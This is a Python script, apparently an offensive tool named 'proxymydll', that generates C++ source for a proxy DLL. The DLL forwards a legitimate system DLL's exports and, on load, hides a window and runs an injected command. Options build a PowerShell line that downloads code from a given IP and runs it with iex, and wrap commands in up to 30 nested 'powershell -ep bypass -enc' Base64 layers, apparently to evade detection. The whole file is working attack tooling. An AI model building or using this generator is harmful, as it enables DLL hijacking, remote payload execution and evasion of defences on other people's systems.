import pefile
import argparse
import os
import sys
import base64


banner = r"""

                                                                                 __  __  __ 
                                                                                |  \|  \|  \
  ______    ______    ______   __    __  __    __  ______ ____   __    __   ____| $$| $$| $$
 /      \  /      \  /      \ |  \  /  \|  \  |  \|      \    \ |  \  |  \ /      $$| $$| $$
|  $$$$$$\|  $$$$$$\|  $$$$$$\ \$$\/  $$| $$  | $$| $$$$$$\$$$$\| $$  | $$|  $$$$$$$| $$| $$
| $$  | $$| $$   \$$| $$  | $$  >$$  $$ | $$  | $$| $$ | $$ | $$| $$  | $$| $$  | $$| $$| $$
| $$__/ $$| $$      | $$__/ $$ /  $$$$\ | $$__/ $$| $$ | $$ | $$| $$__/ $$| $$__| $$| $$| $$
| $$    $$| $$       \$$    $$|  $$ \$$\ \$$    $$| $$ | $$ | $$ \$$    $$ \$$    $$| $$| $$
| $$$$$$$  \$$        \$$$$$$  \$$   \$$ _\$$$$$$$ \$$  \$$  \$$ _\$$$$$$$  \$$$$$$$ \$$ \$$
| $$                                    |  \__| $$              |  \__| $$                  
| $$                                     \$$    $$               \$$    $$                  
 \$$                                      \$$$$$$                 \$$$$$$                   

by: cOnfig                  Resource: https://github.com/c0nfig-17/proxymydll
forked of: mrexodia         Resource: https://github.com/mrexodia/perfect-dll-proxy
"""

print(banner)


def encode_ps(cmd: str) -> str:
    """Encode a command as Base64 UTF-16LE for PowerShell -enc."""
    return base64.b64encode(cmd.encode("utf-16le")).decode()


def recursive_encode_ps(cmd: str, levels: int) -> str:
    """
    Build a nested PowerShell -enc chain of the requested depth.

    Depth 1:
        powershell -ep bypass -enc B64("calc.exe")

    Depth 2:
        powershell -ep bypass -enc B64("powershell -ep bypass -enc B64('calc.exe')")

    Depth N:
        Each layer decodes to another 'powershell -ep bypass -enc ...'
        until the innermost finally decodes and runs the original cmd.
    """
    if levels < 1:
        levels = 1
    if levels > 30:
        print("[-] ERROR: Max encoding depth is 30.")
        sys.exit(1)

    # Start from the original command that we want to end up executing
    script = cmd

    # For levels > 1, wrap the previous script in another powershell -enc
    # but always encode VALID PowerShell code, not raw Base64
    for _ in range(levels - 1):
        inner_b64 = encode_ps(script)
        script = f"powershell -ep bypass -enc {inner_b64}"

    # Outermost layer: this is what we'll actually run via cmd.exe /c
    outer_b64 = encode_ps(script)
    return f"powershell -ep bypass -enc {outer_b64}"


def main():
    parser = argparse.ArgumentParser(description="Generate a proxy DLL")
    parser.add_argument("dll", help="Path to the DLL to generate a proxy for")
    parser.add_argument("--output", "-o", help="Generated C++ proxy file")
    parser.add_argument("--force-ordinals", "-v", action="store_true")

    parser.add_argument("--cmd", help="Command to execute")
    parser.add_argument("--ip", help="IP for downloads")
    parser.add_argument("--down", help="Download file but do NOT execute")
    parser.add_argument("--downexe", help="Download AND execute via IEX")
    parser.add_argument("--enc", type=int, help="Recursive Base64 PS encoding depth")

    args = parser.parse_args()

    dll: str = args.dll
    output: str = args.output

    user_cmd: str = args.cmd
    user_ip: str = args.ip or "0.0.0.0"
    user_down: str = args.down
    user_downexe: str = args.downexe
    enc_depth: int = args.enc

    if user_downexe:
        user_cmd = (
            f"(New-Object System.Net.WebClient).DownloadString('http://{user_ip}/{user_downexe}') | iex"
        )
        mode = "downexe"

    elif user_down:
        user_cmd = (
            f"(New-Object System.Net.WebClient).DownloadString('http://{user_ip}/{user_down}')"
        )
        mode = "down"

    elif user_cmd is not None:
        mode = "cmd"

    else:
        user_cmd = "echo NoCommandProvided"
        mode = "none"

    if enc_depth:
        final_ps = recursive_encode_ps(user_cmd, enc_depth)
        final_cmd = f"cmd.exe /c {final_ps}"
    else:
        final_cmd = f"cmd.exe /c {user_cmd}"

    basename = os.path.basename(dll)

    if output is None:
        file, _ = os.path.splitext(basename)
        output = f"{file}.cpp"

    if not os.path.exists(dll) and not os.path.isabs(dll):
        dll = os.path.join(os.environ["SystemRoot"], "System32", dll)

    if not os.path.exists(dll):
        print(f"File not found: {dll}")
        sys.exit(1)

    pe = pefile.PE(dll)
    regular_exports, com_exports, ordinal_exports = [], [], []
    
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        ordinal = exp.ordinal
        if exp.name is None:
            ordinal_exports.append((f"__proxy{ordinal}", ordinal))
        else:
            name = exp.name.decode()
            if name in {
                "DllCanUnloadNow","DllGetClassObject","DllInstall",
                "DllRegisterServer","DllUnregisterServer"
            }:
                com_exports.append(name)
            else:
                regular_exports.append(name)

    with open(output, "w") as f:

        f.write(f'#define TARGET_IP "{user_ip}"\n')
        f.write("#include <Windows.h>\n\n")

        macros = []
        if regular_exports:
            macros.append(
                f'#define MAKE_EXPORT(func) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\System32\\\\{basename}." func'
            )
        if com_exports:
            macros.append(
                f'#define MAKE_EXPORT_PRIVATE(func) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\System32\\\\{basename}." func ",PRIVATE"'
            )
        if ordinal_exports:
            macros.append(
                f'#define MAKE_EXPORT_ORDINAL(func, ord) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\System32\\\\{basename}.#" #ord ",@" #ord ",NONAME"'
            )

        macros_32 = []
        if regular_exports:
            macros_32.append(
                f'#define MAKE_EXPORT(func) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\SysWOW64\\\\{basename}." func'
            )
        if com_exports:
            macros_32.append(
                f'#define MAKE_EXPORT_PRIVATE(func) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\SysWOW64\\\\{basename}." func ",PRIVATE"'
            )
        if ordinal_exports:
            macros_32.append(
                f'#define MAKE_EXPORT_ORDINAL(func, ord) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\SysWOW64\\\\{basename}.#" #ord ",@" #ord ",NONAME"'
            )

        if macros:
            f.write("#ifdef _WIN64\n")
            for m in macros: 
                f.write(m + "\n")
            f.write("#else\n")
            for m in macros_32: 
                f.write(m + "\n")
            f.write("#endif\n\n")

        for e in regular_exports:
            f.write(f"#pragma comment(linker, MAKE_EXPORT(\"{e}\"))\n")
        for e in com_exports:
            f.write(f"#pragma comment(linker, MAKE_EXPORT_PRIVATE(\"{e}\"))\n")
        for e, o in ordinal_exports:
            f.write(f"#pragma comment(linker, MAKE_EXPORT_ORDINAL(\"{e}\", {o}))\n")

        # ---- DllMain with final command (guarded, only once per process) ----
        f.write(f"""
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{{
    // Ensure payload only runs once per process
    static BOOL g_Executed = FALSE;

    switch (fdwReason)
    {{
        case DLL_PROCESS_ATTACH:
        {{
            if (g_Executed)
                return TRUE;
            g_Executed = TRUE;

            // Avoid extra thread notifications
            DisableThreadLibraryCalls(hinstDLL);

            STARTUPINFOA si = {{ 0 }};
            PROCESS_INFORMATION pi = {{ 0 }};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;

            CreateProcessA(
                NULL,
                (LPSTR)"{final_cmd}",
                NULL,
                NULL,
                FALSE,
                CREATE_NO_WINDOW,
                NULL,
                NULL,
                &si,
                &pi
            );
        }}
        break;
    }}
    return TRUE;
}}
""")

    print(f"[ + ] File provided: {dll}")

    if mode == "cmd":
        print(f"[ + ] Command execution injected: \"{args.cmd}\"")

    if mode == "down":
        print(f"[ + ] Download from: http://{user_ip}/{user_down}")

    if mode == "downexe":
        print(f"[ + ] Download & executed from: http://{user_ip}/{user_downexe}")

    if enc_depth:
        print(f"[ + ] {enc_depth} times encoded in Base64 (recursive PowerShell chain)")

    print(f"[ + ] Output file successfully created: {output}")


if __name__ == "__main__":
    main()
